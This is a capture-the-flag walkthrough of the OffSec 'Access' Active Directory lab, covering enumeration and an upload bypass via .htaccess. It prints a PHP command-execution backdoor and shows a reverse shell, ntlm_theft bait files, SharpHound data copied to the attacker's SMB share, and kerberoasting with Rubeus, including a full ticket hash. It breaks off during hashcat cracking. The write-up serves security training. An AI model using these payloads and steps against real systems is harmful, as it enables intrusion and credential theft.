# Offsec Practice: Access CTF Walkthrough

![LeonardoAi Generated Image](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/leonardoai.jpg 'LeonardoAi Generated Image')

## Introduction

This challenge involved a Windows Active Directory environment combined with a vulnerable web application. The machine required chaining web exploitation with Active Directory attacks such as Kerberoasting and abusing misconfigured privileges to achieve full domain compromise.

This write-up documents my complete thought process, including enumeration, failed attempts, unintended paths, and the intended solution.

## Machine Enumeration

I started with a default Nmap scan to identify open ports and running services. The scan revealed multiple Active Directory–related services such as Kerberos (88), LDAP (389), SMB (445), and WinRM (5985). Additionally, ports 80 and 443 hosted a web application titled “Access The Event”.

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ nmap -sC -sV 192.168.120.187 -oN nmap.init.txt                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 07:48 EST
Nmap scan report for 192.168.120.187
Host is up (0.013s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-29 12:49:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-29T12:49:11
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.24 seconds
```

Based on LDAP responses, I identified the domain: `access.offsec` I added it to `/etc/hosts` for easier access. In background, to ensure no services were missed, I ran an all-ports scan:

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ nmap -p- -T4 192.168.120.187 -oN nmap.all.ports.txt                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 07:50 EST
Nmap scan report for 192.168.120.187
Host is up (0.0098s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49701/tcp open  unknown
49790/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.48 seconds
```

This confirmed the system was a Windows Domain Controller with additional RPC and AD Web Services ports open.

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ nmap -p 9389,47001,49664,49665,49666,49668,49669,49670,49671,49674,49679,49701,49790 -sC -sV 192.168.120.187 -oN nmap.detail.tcp.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 07:55 EST
Nmap scan report for 192.168.120.187
Host is up (0.0089s latency).

PORT      STATE SERVICE    VERSION
9389/tcp  open  mc-nmf     .NET Message Framing
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc      Microsoft Windows RPC
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
49669/tcp open  msrpc      Microsoft Windows RPC
49670/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc      Microsoft Windows RPC
49674/tcp open  msrpc      Microsoft Windows RPC
49679/tcp open  msrpc      Microsoft Windows RPC
49701/tcp open  msrpc      Microsoft Windows RPC
49790/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.54 seconds
```

Put the `ffuf` for web page and directory discovery on port 80. while running ffuf in background tested few other ports such as, port 445 for SMB enumeration and ldap search. The SMB service didn’t give any useful information.

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ smbclient -L //192.168.120.187
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ crackmapexec smb 192.168.120.187 -u '' -p '' --shares
SMB         192.168.120.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False)
SMB         192.168.120.187 445    SERVER           [-] access.offsec\: STATUS_ACCESS_DENIED 
SMB         192.168.120.187 445    SERVER           [-] Error enumerating shares: Error occurs while reading from remote(104)
```

ldapsearch gives one new domain information. Added into the host then I did DNS brute force. I put the sub domain enumeration as well using ffuf and found two new sub domain names.

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ ldapsearch -x -H ldap://192.168.120.187 -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=access,DC=offsec
ldapServiceName: access.offsec:server$@ACCESS.OFFSEC
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=access,DC=offsec
serverName: CN=SERVER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Config
 uration,DC=access,DC=offsec
schemaNamingContext: CN=Schema,CN=Configuration,DC=access,DC=offsec
namingContexts: DC=access,DC=offsec
namingContexts: CN=Configuration,DC=access,DC=offsec
namingContexts: CN=Schema,CN=Configuration,DC=access,DC=offsec
namingContexts: DC=DomainDnsZones,DC=access,DC=offsec
namingContexts: DC=ForestDnsZones,DC=access,DC=offsec
isSynchronized: TRUE
highestCommittedUSN: 90173
dsServiceName: CN=NTDS Settings,CN=SERVER,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=access,DC=offsec
dnsHostName: SERVER.access.offsec
defaultNamingContext: DC=access,DC=offsec
currentTime: 20251129133428.0Z
configurationNamingContext: CN=Configuration,DC=access,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ ldapsearch -x -H ldap://192.168.120.187 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=access,DC=offsec
namingcontexts: CN=Configuration,DC=access,DC=offsec
namingcontexts: CN=Schema,CN=Configuration,DC=access,DC=offsec
namingcontexts: DC=DomainDnsZones,DC=access,DC=offsec
namingcontexts: DC=ForestDnsZones,DC=access,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ ldapsearch -x -H ldap://192.168.133.187 -b 'DC=access,DC=offsec' -s sub
# extended LDIF
#
# LDAPv3
# base <DC=access,DC=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ ldapsearch -x -H ldap://192.168.133.187 -b 'CN=Configuration,DC=access,DC=offsec' -s sub
# extended LDIF
#
# LDAPv3
# base <CN=Configuration,DC=access,DC=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ ldapsearch -x -H ldap://192.168.133.187 -b 'CN=Schema,CN=Configuration,DC=access,DC=offsec' -s sub
# extended LDIF
#
# LDAPv3
# base <CN=Schema,CN=Configuration,DC=access,DC=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ ldapsearch -x -H ldap://192.168.133.187 -b 'DC=DomainDnsZones,DC=access,DC=offsec' -s sub         
# extended LDIF
#
# LDAPv3
# base <DC=DomainDnsZones,DC=access,DC=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

Added new found sub domains into the `/etc/hosts` file.

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ tail -n 1 /etc/hosts    
192.168.133.187	access.offsec SERVER.access.offsec schema.access.offsec configuration.access.offsec domaindnszones.access.offsec forestdnszones.access.offsec
```

Subdomain fuzzing didn’t give any interesting data.

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ ffuf -u 'http://FUZZ.access.offsec' -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 120         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.access.offsec
 :: Wordlist         : FUZZ: /home/kali/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 120
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

server                  [Status: 200, Size: 49680, Words: 13785, Lines: 1101, Duration: 113ms]
domaindnszones          [Status: 200, Size: 49680, Words: 13785, Lines: 1101, Duration: 9ms]
forestdnszones          [Status: 200, Size: 49680, Words: 13785, Lines: 1101, Duration: 10ms]
:: Progress: [4989/4989] :: Job [1/1] :: 8 req/sec :: Duration: [0:05:32] :: Errors: 4986 ::
```

Put the kerbrute for username enumeration on Active directory in background and found a username `Administrator`.

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ ~/tools/windows/kerbrute/kerbrute_linux_amd64 userenum --dc 192.168.120.187 -d access.offsec -o usernames.txt ~/tools/SecLists/Usernames/cirt-default-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/29/25 - Ronnie Flathers @ropnop

2025/11/29 08:45:32 >  Using KDC(s):
2025/11/29 08:45:32 >  	192.168.120.187:88

2025/11/29 08:45:32 >  [+] VALID USERNAME:	 ADMINISTRATOR@access.offsec
2025/11/29 08:45:32 >  [+] VALID USERNAME:	 Administrator@access.offsec
2025/11/29 08:45:32 >  [+] VALID USERNAME:	 administrator@access.offsec
2025/11/29 08:45:32 >  Done! Tested 828 usernames (3 valid) in 0.729 seconds
```

`ffuf` directory brute-forcing revealed an uploads directory. At the home page of port 80, there is a ticket buying page let us to upload a file which can accessible through uploads directory.

![image]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image.png 'Ticket Buying form')

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ ffuf -u 'http://192.168.120.187/FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 120 -fs 304

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.120.187/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 120
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 304
________________________________________________

uploads                 [Status: 301, Size: 344, Words: 22, Lines: 10, Duration: 8ms]
assets                  [Status: 301, Size: 343, Words: 22, Lines: 10, Duration: 13ms]
forms                   [Status: 301, Size: 342, Words: 22, Lines: 10, Duration: 13ms]
licenses                [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 14ms]
phpmyadmin              [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 9ms]
webalizer               [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 18ms]
                        [Status: 200, Size: 49680, Words: 13785, Lines: 1101, Duration: 17ms]
server-status           [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 21ms]
:: Progress: [207629/207629] :: Job [1/1] :: 115 req/sec :: Duration: [0:00:37] :: Errors: 0 ::
```

Tried to upload reverse shell on upload page but could not able to upload a `.php` file. Manipulating file extension’s didn’t allow to upload a reverse shell. Below screenshot looks like giving filename two time works but on the uploads directory it save’s file name with the last name given.

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image1.png)

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image2.png)

Tried to upload other file types with the mindset of NTLM theft. but didn’t receive any NTLM hash in my responder terminal.

```
┌──(kali㉿kali)-[~/…/Practice/Access/exploit/NTLMTheft]
└─$ python3 ~/tools/windows/ntlm_theft/ntlm_theft.py -g all -s 192.168.45.170 -f test
/home/kali/tools/windows/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: test/test.scf (BROWSE TO FOLDER)
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Created: test/test.lnk (BROWSE TO FOLDER)
Created: test/test.rtf (OPEN)
Created: test/test-(stylesheet).xml (OPEN)
Created: test/test-(fulldocx).xml (OPEN)
Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(includepicture).docx (OPEN)
Created: test/test-(remotetemplate).docx (OPEN)
Created: test/test-(frameset).docx (OPEN)
Created: test/test-(externalcell).xlsx (OPEN)
Created: test/test.wax (OPEN)
Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: test/test.asx (OPEN)
Created: test/test.jnlp (OPEN)
Created: test/test.application (DOWNLOAD AND OPEN)
Created: test/test.pdf (OPEN AND ALLOW)
Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: test/test.library-ms (BROWSE TO FOLDER)
Created: test/Autorun.inf (BROWSE TO FOLDER)
Created: test/desktop.ini (BROWSE TO FOLDER)
Created: test/test.theme (THEME TO INSTALL
Generation Complete.

┌──(kali㉿kali)-[~/…/Practice/Access/exploit/NTLMTheft]
└─$ cd test

┌──(kali㉿kali)-[~/…/Access/exploit/NTLMTheft/test]
└─$ ls
 Autorun.inf       'test-(externalcell).xlsx'   test.htm                      test.library-ms  'test-(remotetemplate).docx'   test.theme
 desktop.ini       'test-(frameset).docx'      'test-(icon).url'              test.lnk          test.rtf                     'test-(url).url'
 test.application  'test-(fulldocx).xml'       'test-(includepicture).docx'   test.m3u          test.scf                      test.wax
 test.asx          'test-(handler).htm'         test.jnlp                     test.pdf         'test-(stylesheet).xml'        zoom-attack-instructions.txt
```

After few iteration with file extension tweak and prepend the magic byte. The one way successfully uploaded a reverse shell on the web page as mentioned below.

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image3.png)

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image4.png)

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image5.png)

## Initial Foothold

### Unintended way to get initial access

Generate a base64 encoded reverse shell command through [www.revshells.com](https://www.revshell.com) and start `nc` listener.

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image6.png)

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image7.png)

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ rlwrap nc -lnvp 50505             
listening on [any] 50505 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.133.187] 50206

PS C:\xampp\htdocs\uploads> whoami
access\svc_apache
```

### Intended way to get initial access

try to manipulate the `.htaccess` file. Configure in a such way that `.evil` extension file can execute Php code.

```
┌──(kali㉿kali)-[~/offsec/Practice/Access]
└─$ cat .htaccess    
AddType application/x-httpd-php .evil

┌──(kali㉿kali)-[~/offsec/Practice/Access/exploit]
└─$ cat revshell.evil  
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

Upload both (.htaccess, revshell.evil) the files using Ticket.php function on web application.

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image.png)

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image8.png)

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image9.png)

Follow the same way as mentioned in Unintended way to get a reverse shell on the system.

## Privilege Escalation

Transferred `SharpHound.ps1` file on to the victim’s system and harvest all the data.

```
PS C:\Users\svc_apache\Downloads> . .\SharpHound.ps1
PS C:\Users\svc_apache\Downloads> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc_apache -OutputPrefix "access offsec"

PS C:\Users\svc_apache> net use M: \\192.168.45.170\smbshare /user:testuser testpassword
The command completed successfully.

PS C:\Users\svc_apache> cp "access offsec_20251202072525_BloodHound.zip" M:\
PS C:\Users\svc_apache> net use M: /delete
M: was deleted successfully.
```

`SharpHound.ps1` generated “access offsec_202512020722525_BloodHound.zip” file into the our kali machine and see the data through Bloodhound and PlumHound. The PlumHound gives output that `svc_mssql` user’s can kerberoastable.

![image.png]( https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Access/screenshots/image10.png)

Upload a `Rubeus.exe` in the victim’s system for kerberoast the `svc_mssql` hash. Cracked that hash against the `rockyou.txt` wordlist and quickly got one password matched.

```
 C:\Users\svc_apache\Downloads> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : access.offsec
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 5:33:45 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\svc_apache\Downloads\hashes.kerberoast

[*] Roasted hashes written to : C:\Users\svc_apache\Downloads\hashes.kerberoast
PS C:\Users\svc_apache\Downloads> type hashes.kerberoast
$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$21038308E953F1178C9257EDD1E21EAF$AC40E65CE4CA7EF5FFFE63865F1D9BC81397BA4231C8AB2BFEBDC8B60340FB749406DC23EBE1A3FF4AC0C9E2904141DCE6507B306801ED085FA315C522BBAEF4B9EEAB579382AD3D0D729428CC46DD355E52F49AB2F2BD2B71F0F0D254747B14AD2C0725E6E727DD10E72BDD03867508627C6325DEBB4F4C93A63C2326A18D03FECB990866FC60E3EB1BF6EA98E792B6D75FD8BD2EB245FD83D9528D40B6EDECB3C8333A0732F6FD128EBBDD32B3F65D1AE4645A8E5593E465C8943084D30B00C9D8CEF708CB2D3BD441206962FBD39E001AF4A39465139B44976249DE9BAC5D78B017929CD48F4232C72831F7AC2A289EF742FE2E0795944F5D0964B6128D6A26F1276B64870C3096733C33B3FEC5BB69BF164C03843410963AE458E99CD18D170F06247C0B6967FAF6F3D32BC0A6AA4F26D7A0C0C622516B34DA99BCBB764042F3A27A74C62734460E207D03397F7E673BBB45339E61CFBFE391EF26D00E687DDDCEF74DB68F15C8CB5121BF54DFCAD1E086D2FC02135C3E39B93407F65F087A8231CDF2799701C551D66FDBFF6F75BD3EB353A8D4BF4BAAFF8C8A61FDD191CFC70675491FA925486F8270708C26E4D5118A62A41DD808CCF3FA3BBD02CB2B55F5B8E02339B390E2C1220D9B6B0C6A609B16A4CA560C0BB667642C031256F8320623A9678B935BFB6D42ED2D01674AC67AFD74C222AC4253EB8C8D0635D7255531A0A4959BC702B8CDF6814C385956372FF41F2B23E54EA08DC6A75B8D3854E3C7C6E051A5FAF75F805710615F1CC68C8E5A24ECC332C805087FF4B0CC2BDCCCF0467D6B85ED88B9FD1879DE3D1D702A5B0552D75EE363BF64E65B3BD0388C34EF9C8E59F0C739B8B746D59CA124E46CFFE3B05002F98792D4F98AFE8AEF27CC2D5ACDBD28FA826E3F43361CC50AB01C71BF8F5ED33548AF545E8836908035BC3AA518503FF23EC885C6537713F954C7DBD79C0329468A64AF7288925B767274094A44AA60DD3BC5124A7A7E12D99ED35F53DC72B05A2709636FE4E34E6F1A559E11E72CDDD82EE0B063D09678F8CC881F0126E04DE161DDAA29BE3DE340537DD16560BF3510C90E724374AC796CADB845A30EB9A03E1108EEBF86847CEB33D8AE83A9525AC263B20E97A37C67DC8BAF0EF1D93ED6CBBD69DB77B6A968FE9F1002F2AAB4011F2C3CF11582DAC26B5E52DF4C1E031CEB8C76B6D22F54B78B53B9D6E9D963B27FACC300997515DCF0F4D25397CFE41B7696D1663F496E0C8F30D2139E8EC77233822FE79646CBA22ABD91908A3EAE67E114F15F9A492B7512826E0CB0ED1F3C7F6A42576FA923289C5F6CF86F7B5A072BADBC68687B7B4C24D7AA26A2B6E3374481AB8F7C6710904E7C959CCF58CF24F21F669FF7F3FE2EF2FFC8769CC96E6D2EE8BEBA05AB642376FE8F2AED7D38F61A6BEF913911ADB6D917272E95FB7C7C5A59C84D3519CC4942355AD65D1BD550C21F89DE9C8F7B4AAA701B43F14959E1A6F108D4DDF52E702E0BB58039DBF5AB9EEAADE3E1B9F029AD383BABAA010E67993D2F4F8C5919764E1BD82ABE467EEAB4891D705423FB3713C28937A796991027F0A5025D2AE3433F69E1A4
```

```
C:\...\...\tools\hashcat-7.1.2>hashcat.exe -m 13100 ..\hashes.txt ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt --force
hashcat (v7.1.2) starting
...
...
...
Dictionary cache hit:
* Filename..: ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

